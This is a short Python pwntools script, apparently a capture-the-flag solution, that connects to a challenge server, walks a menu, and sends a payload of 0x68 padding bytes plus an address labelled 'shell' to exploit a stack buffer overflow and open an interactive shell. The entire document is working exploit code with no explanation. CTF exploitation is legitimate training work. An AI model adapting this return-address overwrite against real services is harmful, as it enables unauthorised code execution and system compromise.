from pwn import *

#r = process('./share/ms')
r = remote('chals1.ais3.org',10003)
r.sendline(b'1')
r.sendline(b'a')
r.sendline(b'a')
r.sendline(b'a')
r.sendline(b'3')
shell = 0x40131b
# input()
r.sendline(b'\x00' * 0x68 + p64(shell))
r.interactive()